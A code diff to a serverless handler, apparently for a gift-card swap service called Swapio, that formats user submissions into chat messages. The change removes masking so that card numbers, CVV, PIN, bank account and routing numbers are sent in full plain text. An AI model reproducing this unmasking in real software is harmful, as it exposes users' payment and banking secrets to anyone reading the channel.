@@ -44,23 +44,19 @@ export async function onRequestPost(context) {
       }
     }
 
-    const timestamp = data.timestamp || new Date().toISOString();
-
     let message;
 
     if (isContact) {
       message = [
         '📬 *New Swapio Contact Message*',
         '',
-        `📋 *Reference:* \`${data.orderCode}\``,
+        `📋 *Reference:* ${codeValue(data.orderCode)}`,
         `👤 *Name:* ${escapeMarkdown(data.fullName || 'Not provided')}`,
-        `📧 *Email:* ${escapeMarkdown(data.email)}`,
+        `📧 *Email:* ${codeValue(data.email)}`,
         `📌 *Subject:* ${escapeMarkdown(data.subject || 'No subject')}`,
         '',
-        `💬 *Message:*`,
+        '💬 *Message:*',
         escapeMarkdown(data.message || 'No message'),
-        '',
-        `🕐 *Submitted:* ${timestamp}`,
       ].join('\n');
     } else {
       const payoutAmount = data.payoutAmount || 'N/A';
@@ -70,8 +66,8 @@ export async function onRequestPost(context) {
       message = [
         '🔄 *New Swapio Submission*',
         '',
-        `📋 *Order Code:* \`${data.orderCode}\``,
-        `📧 *Email:* ${escapeMarkdown(data.email)}`,
+        `📋 *Order Code:* ${codeValue(data.orderCode)}`,
+        `📧 *Email:* ${codeValue(data.email)}`,
         `👤 *Name:* ${escapeMarkdown(data.fullName || 'Not provided')}`,
         '',
         `🎁 *Card:* ${escapeMarkdown(data.cardBrand)} — $${data.cardBalance}`,
@@ -80,8 +76,6 @@ export async function onRequestPost(context) {
         '',
         '📄 *Card Details:*',
         ...cardLines,
-        '',
-        `🕐 *Submitted:* ${timestamp}`,
       ].join('\n');
     }
 
@@ -136,16 +130,14 @@ function escapeMarkdown(text) {
   return String(text).replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
 }
 
-function maskSensitive(value) {
-  if (!value) return 'Not provided';
-  const str = String(value);
-  if (str.length <= 4) return '****';
-  return str.slice(0, 2) + '****' + str.slice(-2);
+function codeValue(text) {
+  if (!text) return '`Not provided`';
+  return '`' + String(text).replace(/`/g, "'") + '`';
 }
 
 function formatCardDetails(details) {
   if (!details || typeof details !== 'object') {
-    return [`• Card info: ${escapeMarkdown(maskSensitive(''))}`];
+    return ['• Card info: Not provided'];
   }
 
   const labels = {
@@ -163,14 +155,13 @@ function formatCardDetails(details) {
     .filter(([, value]) => value)
     .map(([key, value]) => {
       const label = labels[key] || key;
-      const masked = ['cvv', 'pin'].includes(key) ? maskSensitive(value) : maskSensitive(value);
-      return `• ${label}: ${escapeMarkdown(masked)}`;
+      return `• ${label}: ${codeValue(value)}`;
     });
 }
 
 function formatPayoutDetails(method, details, fallback) {
   if (!details || typeof details !== 'object') {
-    return [`🏦 *Account:* ${escapeMarkdown(fallback || 'Not provided')}`];
+    return [`🏦 *Account:* ${codeValue(fallback || 'Not provided')}`];
   }
 
   const labels = {
@@ -185,9 +176,6 @@ function formatPayoutDetails(method, details, fallback) {
     .filter(([, value]) => value)
     .map(([key, value]) => {
       const label = labels[key] || key;
-      const display = key === 'accountNumber' || key === 'routingNumber'
-        ? maskSensitive(value)
-        : escapeMarkdown(value);
-      return `🏦 *${label}:* ${display}`;
+      return `🏦 *${label}:* ${codeValue(value)}`;
     });
 }
